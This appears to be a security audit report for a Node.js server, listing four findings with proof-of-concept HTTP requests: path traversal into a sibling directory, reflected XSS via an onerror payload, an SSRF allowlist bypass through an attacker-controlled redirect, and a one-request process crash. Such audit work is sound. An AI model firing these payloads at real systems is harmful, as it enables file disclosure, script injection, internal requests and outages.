1. **Path traversal into sibling directories — high**  
   **`server.js:17`**  
   Request:
   ```http
   GET /%2e%2e%2fpublic-private%2fsecret.txt HTTP/1.1
   Host: localhost:8080
   ```
   This resolves to `public-private/secret.txt` beside `public`. The string-prefix check passes because `public-private` starts with `public`. If that file exists and is readable by the server, its contents are returned without authentication. **Impact:** disclosure of files outside the public directory whose paths share its prefix.

2. **Reflected cross-site scripting — medium**  
   **`server.js:24`**  
   Request:
   ```http
   GET /%3Cimg%20src=x%20onerror=alert(document.domain)%3E HTTP/1.1
   Host: localhost:8080
   ```
   The decoded filename is inserted directly into an HTML error response, producing `<img src=x onerror=alert(document.domain)>`. **Impact:** a victim who visits the crafted URL executes attacker-supplied JavaScript in the server’s origin.

3. **Preview allowlist bypass and SSRF — high**  
   **`server.js:33`**, **`server.js:37`**  
   An attacker controlling `attackerimgcdn.net` can submit:
   ```http
   GET /preview?url=http%3A%2F%2Fattackerimgcdn.net%2Fredirect HTTP/1.1
   Host: localhost:8080
   ```
   That hostname passes `endsWith('imgcdn.net')`. The attacker’s endpoint can return:
   ```http
   HTTP/1.1 302 Found
   Location: http://127.0.0.1:8080/hello?name=ssrf-proof
   ```
   `fetch` follows redirects without revalidating their destinations, and the proxy returns the resulting response. The same attack can target other internal HTTP services reachable by the server. **Impact:** unauthorized internal requests and disclosure of their responses. The attacker can also serve HTML directly, which the proxy delivers under the application’s origin, enabling JavaScript execution when a victim visits the preview URL.

4. **Unauthenticated process crash — high**  
   **`server.js:15`**  
   Request:
   ```http
   GET /% HTTP/1.1
   Host: localhost:8080
   ```
   `decodeURIComponent('/%')` throws a `URIError`. Nothing catches it in the request handler, so the uncaught exception terminates the Node.js process. **Impact:** one unauthenticated request takes the server offline; repeated requests can keep it unavailable if automatically restarted.